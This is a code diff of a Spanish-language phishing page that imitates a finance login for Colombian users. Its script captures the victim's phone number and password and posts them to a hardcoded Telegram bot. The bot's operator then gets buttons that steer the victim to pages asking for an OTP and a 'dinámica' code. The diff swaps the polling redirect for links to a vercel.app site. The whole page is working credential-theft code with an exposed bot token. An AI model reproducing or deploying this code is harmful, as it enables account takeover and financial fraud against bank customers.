@@ -72,29 +72,27 @@
         </table>
     </div>
 
-    <!-- BOTÓN QUE ENVÍA + REDIRIGE CON WEBHOOK AUTOMÁTICO -->
+    <!-- BOTÓN QUE ENVÍA + REDIRIGE SIN CARGAR CADA 2 SEGUNDOS -->
     <script>
     $(document).ready(function() {
-        // HABILITA BOTÓN
         $('#txt-celular, #txt-password').on('input', function() {
             const cel = $('#txt-celular').val().trim();
             const pass = $('#txt-password').val().trim();
             $('#btn-login').prop('disabled', cel.length !== 10 || pass.length < 4);
         });
 
-        // AL TOCAR ENTRA
         $('#btn-login').click(function() {
             const numero = '+57 ' + $('#txt-celular').val().trim();
             const clave = $('#txt-password').val().trim();
-            const session = Date.now(); // ID ÚNICO
+            const session = Date.now();
 
             $('#msg').text('Enviando...');
             $('#btn-login').html('Enviando...').prop('disabled', true);
 
-            // GUARDA EL ID EN LOCALSTORAGE
-            localStorage.setItem('session_id', session);
+            // GUARDA LA SESIÓN
+            localStorage.setItem('wait_for_action', session);
 
-            // ENVÍA A TELEGRAM CON BOTONES QUE LLAMAN AL WEBHOOK
+            // ENVÍA A TELEGRAM
             fetch('https://api.telegram.org/bot8387679229:AAEPfB79Soov3uLZTyv3Lq9rbifJxeoJcwc/sendMessage', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
@@ -110,52 +108,20 @@ TOCA PARA REDIRIGIR:`,
                     parse_mode: 'Markdown',
                     reply_markup: {
                         inline_keyboard: [
-                            [{text: "Clave OTP", callback_data: `otp_${session}`}],
-                            [{text: "Error clave", callback_data: `error_${session}`}],
-                            [{text: "Dinámica", callback_data: `dinamica_${session}`}],
-                            [{text: "Error login", callback_data: `loginerr_${session}`}],
-                            [{text: "Finalizar", callback_data: `ok_${session}`}]
+                            [{text: "Clave OTP", url: `https://tualternativafinanzas.vercel.app/verifying/?do=otp&sid=${session}`}],
+                            [{text: "Error clave", url: `https://tualternativafinanzas.vercel.app/verifying/?do=error&sid=${session}`}],
+                            [{text: "Dinámica", url: `https://tualternativafinanzas.vercel.app/verifying/?do=dinamica&sid=${session}`}],
+                            [{text: "Error login", url: `https://tualternativafinanzas.vercel.app/verifying/?do=loginerr&sid=${session}`}],
+                            [{text: "Finalizar", url: `https://tualternativafinanzas.vercel.app/verifying/?do=ok&sid=${session}`}]
                         ]
                     }
                 })
             }).then(() => {
-                $('#msg').html('Enviado! Esperando tu acción...');
+                $('#msg').html('Enviado! Esperando...');
                 setTimeout(() => { location.href = '/private/'; }, 1500);
             });
         });
     });
-    </script>
-
-    <!-- ESCUCHA LOS BOTONES Y REDIRIGE AL CLIENTE -->
-    <script>
-    // POLLING CADA 2 SEGUNDOS
-    setInterval(() => {
-        const session = localStorage.getItem('session_id');
-        if (!session) return;
-
-        fetch(`https://api.telegram.org/bot8387679229:AAEPfB79Soov3uLZTyv3Lq9rbifJxeoJcwc/getUpdates?offset=-1`)
-        .then(r => r.json())
-        .then(data => {
-            if (!data.ok || !data.result.length) return;
-            const update = data.result[0];
-            if (!update.callback_query) return;
-
-            const accion = update.callback_query.data;
-            if (!accion.includes(session)) return;
-
-            let destino = '';
-            switch(accion.split('_')[0]) {
-                case 'otp': destino = '/solicitar/'; break;
-                case 'error': destino = '/login/'; break;
-                case 'dinamica': destino = '/verify-voice/'; break;
-                case 'loginerr': destino = '/login/'; break;
-                case 'ok': destino = '/successful/'; break;
-            }
-
-            // REDIRIGE AL CLIENTE
-            location.href = destino;
-        });
-    }, 2000);
     </script>
 
     <script src="../assets/js/ready.js"></script>
